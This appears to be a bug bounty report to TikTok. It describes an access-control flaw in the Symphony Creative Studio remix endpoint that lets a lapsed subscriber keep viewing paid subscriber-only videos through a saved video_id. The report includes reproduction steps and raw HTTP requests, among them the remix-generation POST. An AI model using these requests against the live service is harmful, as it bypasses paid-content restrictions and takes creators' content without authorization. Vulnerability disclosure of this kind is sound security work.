**Program:** Tiktok

**Title:** Attacker can have access to watch subscription based content via TikTok Symphony Creative Studio remix endpoint

## Description:

The TikTok Symphony Creative Studio endpoint responsible for video remix generation (`/creative_bff_i18n/api/cue/p2v/generate`) does not revalidate the current authorization state of subscriber-only videos when a `vid` is supplied.

An attacker who was previously subscribed to a paid video can save the `video_id` while they have access, and after their subscription ends, they can still generate remix outputs containing the full visual content of the video. This bypasses TikTok’s subscription restrictions and allows persistent access to content that should no longer be available.

## Steps to Reproduce

1. Subscribe to a subscriber-only video.
2. Capture its video identifier by running the graph ql request below
```
GET <video_link> HTTP/2
Host: www.tiktok.com
Cookie: [redacted]
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: 
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
```
you should find the video_id in the response as shown in the image below
<img width="464" height="423" alt="Screenshot 2026-02-26 120729" src="https://github.com/user-attachments/assets/794f1643-fe2e-4eb0-a668-85172d77cdc3" />

3. Allow the subscription to expire

4. As the attacker Confirm the video is no longer accessible through normal TikTok interfaces.

5. now as the attcker go to (https://ads.tiktok.com/creative/creativestudio/create/history) make sure you are signed up to ads.tiktok.com
6. Now as attacker run the following http request below:
```
POST /creative_bff_i18n/api/cue/p2v/generate? HTTP/2
Host: ads.tiktok.com
Cookie: [redacted]
Content-Length: 376
Sec-Ch-Ua-Platform: "Windows"
X-Csrftoken: Hr5O0QAG11YAJxnWYmXE65xCIXoAxJ5Y
Sec-Ch-Ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Agw-Js-Conv: str
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-Creative-Source: cue/p2v
Content-Type: application/json
Origin: https://ads.tiktok.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ads.tiktok.com/creative/creativestudio/generate
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

{"imageList":[],"vidList":[{"Vid":"saved_video_id","Duration":}],"productId":"","productName":"","sellingPoint":"","scriptSetting":{"language":"en","script_style":[]},"duration":0,"useCreativeTemplate":true,"videoSize":{"2":1,"4":2,"8":1},"creativeStrategyIdList":[],"generateTimes":1,"userScenario":"NoUserInputs","miniAppType":"P2V","settings":""
```
7. Now as the attacker go back to (https://ads.tiktok.com/creative/creativestudio/create/history) and Observe that the system generates remix variations containing the full visual content of the subscription based content video.
<img width="959" height="484" alt="Screenshot 2026-02-26 121927" src="https://github.com/user-attachments/assets/cb117334-6e75-4aaa-bffe-107ea84c78eb" />

## Actual Behavior

- The endpoint processes the vid without checking subscription status.

- Even after the subscription ends, remix outputs include the full original video.

- Audio is replaced with AI narration, but the full visual content is exposed.

## Impact:
This vulnerability allows attackers to persistently access and watch subscriber-only videos after their subscription ends, bypassing TikTok’s content access controls. Because these videos cannot be downloaded or saved normally, this effectively allows full continued access to paid content that should otherwise be restricted.
  
**weakness**: Improper access control

**severity calculation**: AC: Low - PR: low - confidentiality: high - integrity: none - Scope: Unchanged
